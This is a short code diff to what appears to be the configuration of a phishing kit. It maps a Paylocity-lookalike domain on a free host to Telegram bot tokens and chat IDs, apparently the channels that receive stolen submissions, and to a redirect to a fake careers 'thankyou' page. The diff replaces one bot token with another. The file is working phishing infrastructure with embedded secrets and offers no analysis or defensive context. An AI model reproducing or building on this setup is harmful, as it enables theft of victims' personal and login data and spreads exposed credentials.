@@ -15,7 +15,7 @@ $site_map = [
     'thepaylocity.rf.gd' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '7603786731:AAEPbaOXWK9DGtTTH3ZXMoTueem5OSY8uBA', 'chat_id' => '8084520583']
+            ['token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U', 'chat_id' => '7339107338']
         ],
         'redirect' => 'https://thepaylocity.rf.gd/cache_site/careers/all-listings.job.34092/thankyou.html'
     ],
